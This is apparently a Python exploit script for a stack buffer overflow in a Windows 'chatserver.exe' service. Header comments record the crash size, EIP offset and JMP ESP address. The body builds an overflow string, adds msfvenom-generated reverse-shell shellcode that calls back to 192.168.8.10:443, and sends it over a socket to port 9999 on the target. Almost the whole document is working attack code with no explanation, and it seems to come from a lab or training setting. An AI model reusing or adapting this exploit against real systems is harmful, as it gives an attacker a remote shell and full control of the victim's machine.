#!/usr/bin/python

# Vulnerable Server: chatserver.exe
# Tested on: Windows 7
# Debugger: IMD
# Crash Payload Size: 3000
# EIP Location (Pattern_Create): 31704330
# EIP Offset: 2012
# JMP ESP: 625014DF
# MSF-Venom Payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.8.10 LPORT=443 -b "\x00" -f c 

import socket
import sys

username = 'Hacker'
message = "A" * 2012 + "\xdf\x14\x50\x62" + "\x90" * 32
payload = ("\xba\xd3\x3f\xe1\x96\xdd\xc7\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x31\x55\x12\x03\x55\x12\x83\x16\x3b\x03\x63\x64\xac\x41"
"\x8c\x94\x2d\x26\x04\x71\x1c\x66\x72\xf2\x0f\x56\xf0\x56\xbc"
"\x1d\x54\x42\x37\x53\x71\x65\xf0\xde\xa7\x48\x01\x72\x9b\xcb"
"\x81\x89\xc8\x2b\xbb\x41\x1d\x2a\xfc\xbc\xec\x7e\x55\xca\x43"
"\x6e\xd2\x86\x5f\x05\xa8\x07\xd8\xfa\x79\x29\xc9\xad\xf2\x70"
"\xc9\x4c\xd6\x08\x40\x56\x3b\x34\x1a\xed\x8f\xc2\x9d\x27\xde"
"\x2b\x31\x06\xee\xd9\x4b\x4f\xc9\x01\x3e\xb9\x29\xbf\x39\x7e"
"\x53\x1b\xcf\x64\xf3\xe8\x77\x40\x05\x3c\xe1\x03\x09\x89\x65"
"\x4b\x0e\x0c\xa9\xe0\x2a\x85\x4c\x26\xbb\xdd\x6a\xe2\xe7\x86"
"\x13\xb3\x4d\x68\x2b\xa3\x2d\xd5\x89\xa8\xc0\x02\xa0\xf3\x8c"
"\xe7\x89\x0b\x4d\x60\x99\x78\x7f\x2f\x31\x16\x33\xb8\x9f\xe1"
"\x34\x93\x58\x7d\xcb\x1c\x99\x54\x08\x48\xc9\xce\xb9\xf1\x82"
"\x0e\x45\x24\x04\x5e\xe9\x97\xe5\x0e\x49\x48\x8e\x44\x46\xb7"
"\xae\x67\x8c\xd0\x45\x92\x47\x1f\x31\x94\xfc\xf7\x40\xa4\x03"
"\xb3\xcc\x42\x69\xd3\x98\xdd\x06\x4a\x81\x95\xb7\x93\x1f\xd0"
"\xf8\x18\xac\x25\xb6\xe8\xd9\x35\x2f\x19\x94\x67\xe6\x26\x02"
"\x0f\x64\xb4\xc9\xcf\xe3\xa5\x45\x98\xa4\x18\x9c\x4c\x59\x02"
"\x36\x72\xa0\xd2\x71\x36\x7f\x27\x7f\xb7\xf2\x13\x5b\xa7\xca"
"\x9c\xe7\x93\x82\xca\xb1\x4d\x65\xa5\x73\x27\x3f\x1a\xda\xaf"
"\xc6\x50\xdd\xa9\xc6\xbc\xab\x55\x76\x69\xea\x6a\xb7\xfd\xfa"
"\x13\xa5\x9d\x05\xce\x6d\xad\x4f\x52\xc7\x26\x16\x07\x55\x2b"
"\xa9\xf2\x9a\x52\x2a\xf6\x62\xa1\x32\x73\x66\xed\xf4\x68\x1a"
"\x7e\x91\x8e\x89\x7f\xb0")



try:

    print("Sending Payload....")
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.8.111',9999))
    s.recv(1024)
    s.send(username + '\r\n')
    s.recv(1024)
    s.send(message + payload + '\r\n')
    s.close()


except:

    print("Cannot connect to server...")
    sys.exit()

